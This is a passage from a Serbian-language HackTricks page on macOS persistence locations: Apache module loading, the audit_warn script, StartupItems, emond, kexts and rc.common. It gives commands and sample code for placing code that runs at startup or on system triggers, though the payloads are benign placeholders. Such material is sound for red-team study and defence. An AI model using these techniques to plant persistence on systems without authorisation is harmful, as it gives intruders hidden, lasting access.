* Httpd nema ovlašćenja

#### Lokacija

* **`/etc/apache2/httpd.conf`**
* Potreban root
* Okidač: Kada se Apache2 pokrene

#### Opis & Eksploatacija

Možete naznačiti u `/etc/apache2/httpd.conf` da učitate modul dodajući liniju kao što je:

{% code overflow="wrap" %}
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
{% endcode %}

Na ovaj način će vaš kompajlirani modul biti učitan od strane Apache-a. Jedina stvar je da ili treba da **potpišete sa važećim Apple sertifikatom**, ili treba da **dodate novi poverljivi sertifikat** u sistem i **potpišete ga** sa njim.

Zatim, ako je potrebno, da biste bili sigurni da će server biti pokrenut, možete izvršiti:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Primer koda za Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond\_0031/](https://theevilbit.github.io/beyond/beyond\_0031/)

* Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
* Ali morate biti root, auditd mora biti pokrenut i izazvati upozorenje
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* **`/etc/security/audit_warn`**
* Potreban root
* **Okidač**: Kada auditd detektuje upozorenje

#### Opis & Eksploatacija

Kada god auditd detektuje upozorenje, skripta **`/etc/security/audit_warn`** se **izvršava**. Tako možete dodati svoj payload u nju.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Možete naterati upozorenje sa `sudo audit -n`.

### Stavke pri pokretanju

{% hint style="danger" %}
**Ovo je zastarelo, tako da ne bi trebalo da se nađe ništa u tim direktorijumima.**
{% endhint %}

**StartupItem** je direktorijum koji treba da bude smešten u `/Library/StartupItems/` ili `/System/Library/StartupItems/`. Kada je ovaj direktorijum uspostavljen, mora sadržati dva specifična fajla:

1. **rc skripta**: Shell skripta koja se izvršava pri pokretanju.
2. **plist fajl**, specifično nazvan `StartupParameters.plist`, koji sadrži razne konfiguracione postavke.

Osigurajte da su i rc skripta i `StartupParameters.plist` fajl ispravno smešteni unutar **StartupItem** direktorijuma kako bi proces pokretanja mogao da ih prepozna i koristi.

{% tabs %}
{% tab title="StartupParameters.plist" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{% endtab %}

{% tab title="superservicename" %}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{% endtab %}
{% endtabs %}

### ~~emond~~

{% hint style="danger" %}
Ne mogu pronaći ovu komponentu na svom macOS-u, pa za više informacija proverite izveštaj
{% endhint %}

Izveštaj: [https://theevilbit.github.io/beyond/beyond\_0023/](https://theevilbit.github.io/beyond/beyond\_0023/)

Uveden od strane Apple-a, **emond** je mehanizam za logovanje koji deluje nedovoljno razvijen ili možda napušten, ali ostaje dostupan. Iako nije posebno koristan za Mac administratora, ova nejasna usluga može poslužiti kao suptilan metod postojanosti za pretnje, verovatno neprimećen od strane većine macOS administratora.

Za one koji su svesni njenog postojanja, identifikacija bilo kakve zlonamerne upotrebe **emond**-a je jednostavna. LaunchDaemon sistema za ovu uslugu traži skripte za izvršavanje u jednoj direktorijumu. Da biste to proverili, može se koristiti sledeća komanda:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

#### Lokacija

* **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
* Potrebne su administratorske privilegije
* **Okidač**: Sa XQuartz

#### Opis i Eksploatacija

XQuartz više **nije instaliran u macOS**, pa ako želite više informacija, proverite izveštaj.

### ~~kext~~

{% hint style="danger" %}
Veoma je komplikovano instalirati kext čak i kao root, tako da ovo neću smatrati za izlazak iz sandboxes ili čak za postojanost (osim ako nemate eksploataciju)
{% endhint %}

#### Lokacija

Da bi se KEXT instalirao kao stavka pri pokretanju, mora biti **instaliran na jednoj od sledećih lokacija**:

* `/System/Library/Extensions`
* KEXT datoteke ugrađene u OS X operativni sistem.
* `/Library/Extensions`
* KEXT datoteke instalirane od strane softvera trećih strana

Možete nabrojati trenutno učitane kext datoteke sa:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Za više informacija o [**proveri kernel ekstenzija pogledajte ovu sekciju**](macos-security-and-privilege-escalation/mac-os-architecture/#i-o-kit-drivers).

### ~~amstoold~~

Pisanje: [https://theevilbit.github.io/beyond/beyond\_0029/](https://theevilbit.github.io/beyond/beyond\_0029/)

#### Lokacija

* **`/usr/local/bin/amstoold`**
* Potrebne su administratorske privilegije

#### Opis i eksploatacija

Naizgled, `plist` iz `/System/Library/LaunchAgents/com.apple.amstoold.plist` je koristio ovu binarnu datoteku dok je izlagao XPC servis... stvar je u tome što binarna datoteka nije postojala, tako da ste mogli staviti nešto tamo i kada se XPC servis pozove, vaša binarna datoteka će biti pozvana.

Više ne mogu da pronađem ovo na svom macOS-u.

### ~~xsanctl~~

Pisanje: [https://theevilbit.github.io/beyond/beyond\_0015/](https://theevilbit.github.io/beyond/beyond\_0015/)

#### Lokacija

* **`/Library/Preferences/Xsan/.xsanrc`**
* Potrebne su administratorske privilegije
* **Okidač**: Kada se servis pokrene (retko)

#### Opis i eksploatacija

Naizgled, nije baš uobičajeno pokretati ovaj skript i nisam mogao ni da ga pronađem na svom macOS-u, tako da ako želite više informacija, pogledajte pisanje.

### ~~/etc/rc.common~~

{% hint style="danger" %}
**Ovo ne funkcioniše u modernim verzijama MacOS-a**
{% endhint %}

Takođe je moguće ovde postaviti **komande koje će se izvršavati prilikom pokretanja.** Primer regularnog rc.common skripta:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Tehnike i alati za postojanost

* [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
* [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
